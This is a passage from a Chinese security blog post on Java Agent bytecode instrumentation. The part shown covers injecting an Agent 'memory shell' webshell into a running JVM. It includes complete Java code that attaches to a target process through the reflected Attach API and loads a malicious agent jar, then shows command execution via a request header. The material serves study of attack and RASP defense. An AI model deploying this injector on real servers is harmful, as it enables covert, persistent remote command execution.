我们可以将JVM中 `Class` 对象包装成一个 **ClassClassPath** 对象。这个对象会告诉 Javassist 从 `cls` (**Class** 对象) 所属的位置加载类文件

```
ClassClassPath classClassPath = new ClassClassPath(cls);
classPool.insertClassPath(classClassPath);
```

解决上面两个问题后我们可以使用命令mvn clean package将上面的内存马文件打包成jar包并且上传到主应用服务器上

打包成功后我们需要借助JVM TI的Attach API 将Agent内存马动态加载到正在运行的项目的JVM上

这里有一个问题，使用Attach API的话需要调用com.sun.tools.attach.VirtualMachine类，该类属于 JDK 的 **tools.jar**，这个库并不总是在 Java 运行时环境（JRE）中可用，它通常存在于 Java 开发工具包（JDK）中。所以，这个tools.jar在JVM启动的时候并不会默认加载。

因此我们可以使用 **URLClassLoader** 加载项目机器 **tools.jar** 并通过反射调用其方法，可以动态地解决这个依赖问题，允许代码在没有直接包含 **tools.jar** 的运行时环境中执行。

(注：如果应用部署在仅含有 JRE 的环境中，并且该应用所在的服务器上也并没有装jdk，那么无论是通过反射还是直接引用，**tools.jar** 这个包都不会存在于环境中。因此无法利用)

下面我们实现Inject\_Memshell类，用于将Agent内存马注入项目中

```
public class Inject_Memshell {
    public static void main(String[] args){
        try {
            // 恶意agent内存马在服务器上的位置
            String AgentPath = "D:\LTools\Java_Projects\Java_Agent\Agent_Memshell\Agent_Memshell\target\Agent_Memshell-1.0-SNAPSHOT.jar";

            // 在JVM启动时，没有加载tools.jar，这里通过URLClassLoader进行加载
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            System.out.println(toolsPath.getAbsolutePath());
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader loader = new java.net.URLClassLoader(new java.net.URL[]{url});

            // 加载tools.jar包中的 VirtualMachine / VirtualMachineDescriptor 类
            Class<?> VirtualMachine = loader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> VirtualMachineDescriptor = loader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");

            // 反射获取list方法
            Method listMethod = VirtualMachine.getDeclaredMethod("list", null);
            // 通过调用list方法获取JVM绑定的服务
            List<Object> list = (java.util.List<Object>) listMethod.invoke(VirtualMachine, null);
            for (int i = 0; i < list.size(); i++) {
                // 遍历所有的JVM，获取其名称组件
                Object obj = list.get(i);
                Method displayName = VirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                String name = (String) displayName.invoke(obj,null);
                System.out.println(name);
                // 判断需要注入的组件名称
                if (name.contains("DemoApplication")){
                    // 获取对应的pid进程号
                    Method getId = VirtualMachineDescriptor.getDeclaredMethod("id",null);
                    String id = (String) getId.invoke(obj,null);
                    System.out.println("id => " + id);
                    Method attach = VirtualMachine.getDeclaredMethod("attach", String.class);
                    Object vm = attach.invoke(VirtualMachine, id);
                    // 调用loadAgent动态注入agent
                    Method loadAgent = VirtualMachine.getDeclaredMethod("loadAgent", String.class);
                    loadAgent.invoke(vm, AgentPath);

                    Method detach = VirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    System.out.println("Inject Success!");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

使用命令mvn clean package将上面的Inject\_Memshell 文件打包成jar包，并且将主项目也打包成jar包

![image 25.png](images/10d8b563-4e41-38ad-afe3-9ed2268e605f)

运行主项目java -jar DemoApplication-1.0-SNAPSHOT.jar

​

![image 26.png](images/4b411b1b-7479-3c18-b661-1b50005ced84)

正常访问请求，此时Cmd请求头并没有生效

![image 27.png](images/32a42029-0389-30d3-a9a8-532c6f5ff378)

在主项目的服务器上运行打包好的Inject\_Memshell 的jar包：java -jar Inject\_Memshell-1.0-SNAPSHOT.jar，返回 Inject Success!

![image 28.png](images/47781032-c36c-3947-b650-29b4061394b7)

在项目的终端也显示注入成功

![image 29.png](images/4e045391-5668-3cea-89e1-0fbc6f024310)

此时发出恶意请求，命令执行成功

![image 30.png](images/347f785f-372d-3a5c-b239-ef4df8edad4a)

目前常见的是Agent类型内存马利用是上传 agent.jar 到服务器用来承载webshell功能。冰蝎服务端会调用Java API将 agent.jar 植入自身进程完成注入。

冰蝎的开发者rebeyond师傅在[《Java内存攻击技术漫谈》](https://xz.aliyun.com/t/10075?time__1311=Cqjx2DRQDQDtYGXPnQDuDfxiTkAr7FeeW4D)，提出了无文件agent植入技术，整个Agent注入的过程不需要在目标磁盘上落地文件，但是会有一定概率会导致项目崩溃。在[《论如何优雅的注入Java Agent内存马》](https://xz.aliyun.com/t/11640?time__1311=Cq0xRQiQeWqQqGNDQ0n02DniKOyD0KEm3x#toc-3)中提出了一种新的无文件植入内存马技术，并集成在了冰蝎v4.0中

# 4、总结

文章浅析了JavaAgent技术在不同场景下的实现与应用。通过分析字节码操作工具（如Javassist和ASM）的底层原理，结合JVMTI接口，系统性地呈现了动态代码插桩、运行时行为监控等关键技术手段。同时简单的延伸至RASP的实践框架及内存马，以及在实时威胁检测与攻击防御中的创新应用。  
该文为本人在学习字节码相关技术过程中的一点记录与思考，如有有问题的地方欢迎师傅们指出。

​

​

​

**参考：**

<https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html>
